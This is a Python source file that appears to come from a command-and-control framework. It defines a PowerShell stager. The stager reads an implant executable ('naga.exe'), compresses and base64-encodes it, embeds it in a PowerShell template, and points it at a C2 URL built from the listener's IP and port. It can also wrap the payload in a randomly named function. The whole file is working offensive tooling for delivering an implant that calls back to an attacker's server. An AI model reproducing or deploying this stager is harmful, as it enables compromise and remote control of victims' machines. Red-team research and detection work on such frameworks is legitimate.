import logging
from core.utils import gen_random_string
from core.teamserver.stager import Stager
from core.teamserver.utils import dotnet_deflate_and_encode

class STStager(Stager):
    def __init__(self):
        self.name = 'powershell'
        self.description = 'Stage via a PowerShell script'
        self.suggestions = ''
        self.extension = 'ps1'
        self.author = '@byt3bl33d3r'
        self.options = {
            'AsFunction': {
                'Description'   :   "Generate stager as a PowerShell function",
                'Required'      :   False,
                'Value'         :   True
            }
        }

    def generate(self, listener):
        with open('./core/teamserver/data/naga.exe', 'rb') as dll:
            with open('core/teamserver/stagers/templates/posh.ps1') as template:
                template = template.read()
                c2_url = f"{listener.name}://{listener['BindIP']}:{listener['Port']}"

                if bool(self.options['AsFunction']['Value']) is True:
                    function_name = gen_random_string(6).upper()
                    template = f"""function Invoke-{function_name}
{{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Url
    )

    {template}
}}
Invoke-{function_name} -Url "{c2_url}"
"""
                else:
                    template = template.replace("$Url", f'"{c2_url}"')

                dll = dll.read()
                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(dll))
                template = template.replace("DATA_LENGTH", str(len(dll)))
                return template
